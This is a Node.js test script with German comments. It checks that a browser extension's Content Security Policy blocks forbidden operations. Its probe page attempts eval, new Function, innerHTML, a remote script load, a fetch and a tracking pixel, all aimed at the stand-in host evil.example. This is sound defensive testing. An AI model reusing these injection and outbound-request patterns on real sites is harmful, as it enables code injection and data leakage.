/*
 * CSP-/Trusted-Types-Probe mit ECHTEM Erweiterungscode (nicht über DevTools, das die CSP teils umgeht).
 *   node tests/csp-probe.test.js [erweiterungsordner]
 * Legt eine Testkopie mit einer Probe-Seite an, die verbotene Dinge versucht. Alles muss blockiert sein.
 */
'use strict';
const fs = require('fs');
const path = require('path');
const { startServers, launch, extensionId, sleep } = require('./lib/harness');

const SRC = path.resolve(process.argv[2] || path.join(__dirname, '..'));
const PROBE = `
const r = {};
const t = (name, fn) => { try { fn(); r[name] = 'AUSGEFÜHRT'; } catch (e) { r[name] = 'blockiert'; } };
t('eval', () => eval('1+1'));
t('indirektes eval', () => (0, eval)('1+1'));
t('new Function', () => new Function('return 2')());
t('setTimeout mit String', () => setTimeout('document.title="X"', 0));
t('innerHTML', () => { document.createElement('div').innerHTML = '<b>x</b>'; });
t('fremdes Skript', () => { const s = document.createElement('script'); s.src = 'https://evil.example/x.js'; document.head.append(s); });
r['fetch'] = 'läuft';
fetch('https://evil.example/').then(() => (r['fetch'] = 'AUSGEFÜHRT'), () => (r['fetch'] = 'blockiert'));
const img = new Image(); img.src = 'https://evil.example/pixel.gif';
setTimeout(() => { document.title = JSON.stringify(r); }, 600);
`;

(async () => {
  const srv = await startServers();
  const dir = path.join(srv.tmp, 'probe-ext');
  fs.cpSync(SRC, dir, { recursive: true, filter: (s) => !/^(tests|tools|node_modules|\.git|dist)([\\/]|$)/.test(path.relative(SRC, s)) });
  fs.writeFileSync(path.join(dir, 'probe.html'), '<!doctype html><meta charset="utf-8"><title>probe</title><script src="probe.js"></script>');
  fs.writeFileSync(path.join(dir, 'probe.js'), PROBE);
  const ctx = await launch(srv.tmp, 'probe', dir);
  const { id } = await extensionId(ctx);
  const p = await ctx.newPage();
  await p.goto(`chrome-extension://${id}/probe.html`);
  await sleep(1500);
  const res = JSON.parse(await p.title());
  let failed = 0;
  for (const [k, v] of Object.entries(res)) {
    const ok = v === 'blockiert';
    if (!ok) failed++;
    console.log(`${ok ? '✔' : '✘'} ${k}: ${v}`);
  }
  const leaked = srv.log.filter((l) => /evil/.test(l.host)).length;
  console.log(`${leaked ? '✘' : '✔'} Anfragen an evil.example, die einen Server erreicht haben: ${leaked}`);
  await ctx.close();
  srv.close();
  process.exit(failed || leaked ? 1 : 0);
})().catch((e) => {
  console.error(e);
  process.exit(2);
});
